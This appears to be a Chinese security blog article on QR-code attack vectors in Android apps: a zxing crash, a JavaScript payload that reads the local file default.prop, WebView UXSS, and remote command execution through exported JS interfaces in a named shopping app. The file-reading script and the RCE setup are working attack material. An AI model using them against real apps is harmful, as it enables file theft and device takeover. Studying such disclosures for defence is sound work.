# Android平台下二维码漏洞攻击杂谈

0x00 前言
=======

* * *

现在Android App几乎都有二维码扫描功能，如果没有考虑到二维码可能存在的安全问题，将会导致扫描二维码就会受到漏洞攻击，严重的可能导致手机被控制，信息泄漏等风险。

0x01 拒绝服务
=========

* * *

低版本的zxing这个二维码库在处理畸形二维码时存在数组越界，导致拒绝服务。扫描下面的二维码，可能导致主程序崩溃：

![p1](http://drops.javaweb.org/uploads/images/c9d4c2949e067f32323395daf0293e19892ea37d.jpg)

通过程序的崩溃日志可以看出是个数组越界：

```
11-23 10:39:02.535: E/AndroidRuntime(1888): FATAL EXCEPTION: Thread-14396 
11-23 10:39:02.535: E/AndroidRuntime(1888): Process: com.xxx, PID: 1888 
11-23 10:39:02.535: E/AndroidRuntime(1888): java.lang.ArrayIndexOutOfBoundsException: length=9; index=9 
11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.common.BitSource.readBits(Unknown Source) 
11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.qrcode.decoder.DecodedBitStreamParser.decodeAlphanumericSegment(Unknown Source) 
11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.qrcode.decoder.DecodedBitStreamParser.decode(Unknown Source) 
11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.qrcode.decoder.Decoder.decode(Unknown Source) 
11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.qrcode.QRCodeReader.decode(Unknown Source) 
11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.MultiFormatReader.decodeInternal(Unknown Source) 
11-23 10:39:02.535: E/AndroidRuntime(1888):   at com.google.zxing.MultiFormatReader.decodeWithState(Unknown Source) 

```

0x02 本地文件读取
===========

* * *

之前Wooyun上爆了一个[利用恶意二维码攻击快拍](http://www.wooyun.org/bugs/wooyun-2010-09145)的漏洞，识别出来的二维码默认以html形式展示(Android+Iphone)，可以执行html和js。将下面的js在cli.im网站上生成二维码：

```
<script>
x=new XMLHttpRequest(); 
if(x.overrideMimeType) 
x.overrideMimeType('text/xml'); 
x.open("GET", "file://///default.prop", false); 
x.send(null); 
alert(x.responseText); 
</script>

```

![p2](http://drops.javaweb.org/uploads/images/f5909f74c3f932b60dc59d150a0b5a19237c1c73.jpg)

用快拍扫描之后，就能读取本地文件内容：

![p3](http://drops.javaweb.org/uploads/images/72d505e9cd26fa0e54ccfee28f6f6a3416cc8c57.jpg)

0x03 UXSS
=========

* * *

去年，Android平台上的Webview UXSS漏洞被吵的沸沸扬扬，由于低版本的Android系统自带的Webview组件使用Webkit作为内核，导致Webkit的历史漏洞就存在于Webview里面，其中就包括危害比较大的UXSS漏洞。

Webview组件几乎存在于所有Android App中，用来渲染网页。如果扫描二维码得到的结果是个网址，大部分App会直接用Webview来打开，由于Webview存在UXSS漏洞，很容易导致资金被窃、帐号被盗或者隐私泄露。漏洞介绍可参考TSRC博文：[Android Webview UXSS 漏洞攻防](http://security.tencent.com/index.php/blog/msg/70)

![p4](http://drops.javaweb.org/uploads/images/d8a381411911607de56b833ae638910892cd8e49.jpg)

0x04 远程命令执行
===========

* * *

大部分Android App扫描二维码之后，如果识别到的二维码内容是个网址时，会直接调用Webview来进行展示。如果Webview导出了js接口，并且targetSDK是在17以下，就会受到远程命令执行漏洞攻击风险。

苏宁易购Android版扫描二维码会用Webview打开网页，由于苏宁易购导出多个js接口，因此扫描二维码即会受到远程命令执行漏洞攻击（最新版本已修复）。

`com.suning.mobile.ebuy.host.webview.WebViewActivity`导出多个js接口：

```
this.b(this.a);
            this.s = this.findViewById(2131494713);
            this.d = this.findViewById(2131494100);
            this.d.a(((BaseFragmentActivity)this));
            this.l = new SNNativeClientJsApi(this);
            this.d.addJavascriptInterface(this.l, "client");
            this.d.addJavascriptInterface(this.l, "SNNativeClient");
            this.d.addJavascriptInterface(new YifubaoJSBridge(this), "YifubaoJSBridge");

```

由于targetSDKversion为14，因此所有Android系统版本都受影响：

```
<uses-sdk
android:minSdkVersion="8"
android:targetSdkVersion="14"
>
</uses-sdk>

```

苏宁易购Android版首页有个扫描二维码的功能：

![p5](http://drops.javaweb.org/uploads/images/c9ed9cd432f92bb6d5f00f8fbded397fd2993a9d.jpg)

扫描二维码时，如果二维码是个网页链接，就会调用上面的Webview组件打开恶意网页：

![p6](http://drops.javaweb.org/uploads/images/63a8a59655bc2f9dc7415b9fffc86fd8869a1610.jpg)

恶意二维码如下：

![p7](http://drops.javaweb.org/uploads/images/77905edcc6e23e79f5725248d144bab0c99abcbf.jpg)

0x05 总结
=======

* * *

二维码可能攻击的点还不止上面列的那些，发散下思维，还有zip目录遍历导致的远程代码执行漏洞，还有sql注入漏洞，说不定还有缓冲区溢出漏洞。思想有多远，攻击面就有多宽！Have Fun！